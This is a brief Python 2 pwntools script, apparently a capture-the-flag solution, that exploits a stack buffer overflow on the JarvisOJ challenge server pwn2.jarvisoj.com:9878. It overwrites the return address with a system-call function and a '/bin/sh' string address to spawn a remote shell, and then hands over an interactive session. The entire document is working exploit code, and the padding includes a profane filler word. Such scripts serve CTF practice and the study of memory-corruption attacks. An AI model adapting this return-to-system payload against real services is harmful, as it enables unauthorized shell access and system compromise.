#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

bin_sh_addr = 0x0804A024
callsystem_addr = 0x0804845C
conn = remote('pwn2.jarvisoj.com', 9878)

print conn.read(),
conn.send_raw('A' * 0x88 + 'fuck' + pack(callsystem_addr, 32) + pack(bin_sh_addr, 32))
conn.interactive()
